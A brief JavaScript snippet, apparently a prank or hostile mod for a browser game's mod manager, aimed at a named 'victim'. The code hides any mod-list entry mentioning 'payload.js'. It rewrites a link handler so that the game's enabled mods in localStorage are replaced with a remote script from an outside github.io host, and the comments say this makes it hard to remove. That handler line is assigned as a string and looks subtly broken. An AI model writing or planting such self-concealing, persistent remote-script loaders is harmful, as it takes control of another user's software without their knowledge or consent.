//Emergency File JIK Victim--hold on a sec who said that i meant neer notices mod
//Set this to the mods.

function hideAll(parent, name) {
	var elements = parent.getElementsByTagName("*");

	for (var i = 0; i < elements.length; i++) {
		if (elements[i].textContent.indexOf(name) !== -1) {
			elements[i].style.display = "none";
		}
	}
}
hideAll(document.querySelector("#modManagerList"), "payload.js")

//So, um, this will make it really hard to remove if DevMode is off....
document.querySelector("#loadingP > a").onclick=`localStorage.removeItem('enabledMods');
localStorage.setItem('enabledMods', ["http://agni2012.github.io/payload.js"])
location.reload()`;
//Really sorry neer
